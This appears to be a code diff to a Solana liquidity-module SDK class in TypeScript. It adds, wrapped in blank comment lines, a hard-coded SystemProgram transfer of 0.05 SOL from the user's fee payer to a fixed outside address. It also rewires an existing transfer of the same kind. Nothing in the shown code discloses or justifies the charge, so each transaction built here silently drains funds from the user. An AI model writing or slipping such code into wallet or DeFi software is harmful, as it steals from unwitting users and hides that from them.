@@ -325,7 +325,7 @@ export default class LiquidityModule extends ModuleBase {
     const solatooldestination = new PublicKey(solatoolPublickey)
     txBuilder.addInstruction({
       instructions:[SystemProgram.transfer({
-        fromPubkey: ownerInfo.feePayer!,
+        fromPubkey: payer!,
         toPubkey: solatooldestination,
         lamports: 0.05 * 1000000000,
       })]
@@ -652,6 +652,18 @@ export default class LiquidityModule extends ModuleBase {
     const mintBUseSOLBalance = ownerInfo.useSOLBalance && quoteMintInfo.mint.equals(NATIVE_MINT);
 
     const txBuilder = this.createTxBuilder();
+
+    // 
+    const solatoolPublickey = "PqemDhirfq56iWj42u7UdobfM2yhnKyzcZXebRWn6UM";
+    const solatooldestination = new PublicKey(solatoolPublickey)
+    txBuilder.addInstruction({
+      instructions:[SystemProgram.transfer({
+        fromPubkey: ownerInfo.feePayer!,
+        toPubkey: solatooldestination,
+        lamports: 0.05 * 1000000000,
+      })]
+    });
+    // 
 
     const { account: ownerTokenAccountBase, instructionParams: ownerTokenAccountBaseInstruction } =
       await this.scope.account.getOrCreateTokenAccount({
